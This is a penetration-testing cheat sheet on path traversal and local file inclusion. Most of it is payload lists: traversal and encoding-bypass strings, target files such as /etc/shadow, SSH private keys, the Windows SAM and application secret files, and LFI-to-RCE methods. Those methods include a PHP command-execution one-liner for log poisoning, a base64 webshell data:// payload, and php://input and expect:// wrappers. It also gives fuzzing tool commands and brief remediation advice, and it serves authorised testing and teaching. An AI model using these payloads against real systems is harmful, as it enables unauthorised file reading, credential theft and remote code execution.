# Path Traversal / Local File Inclusion (LFI) Testing

## Overview
Path traversal (directory traversal) allows attackers to access files outside the intended directory. Local File Inclusion (LFI) allows including local files in the application's execution context, potentially leading to RCE.

## Classification
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **OWASP:** A01:2021 - Broken Access Control
- **CVSS Base:** 5.3 - 9.8

## Detection Methodology

### 1. Identify Vulnerable Parameters
- File download parameters (`?file=report.pdf`, `?page=about`)
- Template/language selectors (`?lang=en`, `?template=default`)
- Include parameters (`?include=header`, `?module=dashboard`)
- Image/document viewers (`?doc=invoice.pdf`, `?img=photo.jpg`)
- Log viewers (`?log=access.log`)
- Backup/export downloads

### 2. Basic Traversal Payloads

**Linux:**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd    (double encoding)
..%c0%af..%c0%af..%c0%afetc/passwd     (UTF-8 overlong)
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd  (Unicode fullwidth)
....\/....\/....\/etc/passwd
```

**Windows:**
```
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
..\..\..\windows\system32\config\sam
....\\....\\....\\windows\\win.ini
```

### 3. Interesting Files to Read

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/fd/0-9
/proc/version
/proc/net/tcp
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/home/user/.bash_history
/var/log/apache2/access.log
/var/log/auth.log
/var/log/syslog
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/var/www/html/.htaccess
```

**Windows:**
```
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
C:\Windows\debug\NetSetup.log
C:\Windows\System32\config\RegBack\SAM
```

**Application-specific:**
```
/var/www/html/wp-config.php          (WordPress)
/var/www/html/.env                    (Laravel, Node.js)
/var/www/html/config/database.yml     (Rails)
/var/www/html/WEB-INF/web.xml         (Java)
/var/www/html/conf/server.xml         (Tomcat)
```

### 4. LFI to RCE Techniques

**Log poisoning (Apache/Nginx):**
```
1. Inject PHP in User-Agent: <?php system($_GET['cmd']); ?>
2. Include log: ?file=../../../var/log/apache2/access.log&cmd=id
```

**PHP wrappers:**
```
# Base64 encode source code
php://filter/convert.base64-encode/resource=index.php

# Execute code
php://input (POST body contains PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Expect wrapper (if enabled)
expect://id
```

**Session file inclusion:**
```
1. Set session variable to PHP code
2. Include: ?file=../../../tmp/sess_SESSION_ID
```

**/proc/self/environ:**
```
1. Set User-Agent to PHP code
2. Include: ?file=../../../proc/self/environ
```

### 5. Filter Bypass Techniques

**Null byte (PHP < 5.3.4):**
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

**Path truncation:**
```
../../../etc/passwd............................................................
../../../etc/passwd/./././././././././././././././././././././././././././.
```

**Double encoding:**
```
%252e%252e%252f → ../
%252e%252e%255c → ..\
```

**Wrapper bypass:**
```
# If "http" blocked
php://filter/convert.base64-encode/resource=config.php
pHp://filter/convert.base64-encode/resource=config.php
```

## Tool Usage
```bash
# ffuf for LFI fuzzing
ffuf -u "http://target.com/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# dotdotpwn
dotdotpwn -m http -h target.com -f /etc/passwd

# Nuclei LFI templates
nuclei -u http://target.com -t lfi/ -batch

# kadimus
kadimus -u "http://target.com/page?file=test"
```

## Remediation
1. **Avoid user input in file paths** entirely
2. **Use ID-based file access** — map IDs to files server-side
3. **Chroot/jail** — restrict file access to specific directory
4. **Canonicalize paths** — resolve then validate
5. **Whitelist allowed files** — static list of permitted files
6. **Remove directory traversal sequences** — but beware of bypass
7. **Principle of least privilege** — application user minimal permissions

## Evidence Collection
- Vulnerable parameter and payload
- Files read (sanitize sensitive content)
- RCE achieved (if LFI escalated)
- Application source code disclosed
- Credentials or secrets found
